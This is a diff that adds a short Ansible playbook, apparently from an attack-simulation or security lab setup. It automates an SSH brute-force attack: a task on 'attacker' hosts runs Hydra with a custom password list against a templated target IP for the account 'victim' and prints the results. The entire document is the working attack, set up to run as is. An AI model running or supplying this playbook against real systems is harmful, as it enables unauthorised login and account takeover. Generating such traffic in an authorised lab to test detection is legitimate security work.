@@ -1,0 +1,19 @@
+
+---
+- name: SSH Brute Force Attack
+  hosts: attackers
+  gather_facts: no
+  
+  tasks:
+    - name: Run Hydra from Kali
+      shell: |
+        hydra -l victim \
+              -P /home/kali/custom-passwords.txt \
+              -t 4 -f \
+              ssh://{{ target_ip }} 2>&1 | head -n 50
+      register: output
+      ignore_errors: yes
+    
+    - name: Results
+      debug:
+        var: output.stdout_lines
